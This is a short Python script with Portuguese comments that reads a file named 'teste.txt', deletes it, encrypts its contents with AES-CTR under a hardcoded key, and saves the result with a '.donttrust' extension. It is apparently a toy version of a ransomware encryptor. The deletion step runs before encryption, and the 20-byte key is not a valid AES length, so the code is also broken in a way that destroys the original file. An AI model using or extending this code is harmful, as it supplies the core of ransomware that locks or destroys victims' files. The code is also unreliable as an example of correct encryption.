import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

os.remove(file_name)

key = b"pudimcomaveiaecanela"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

new_file = file_name + ".donttrust"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
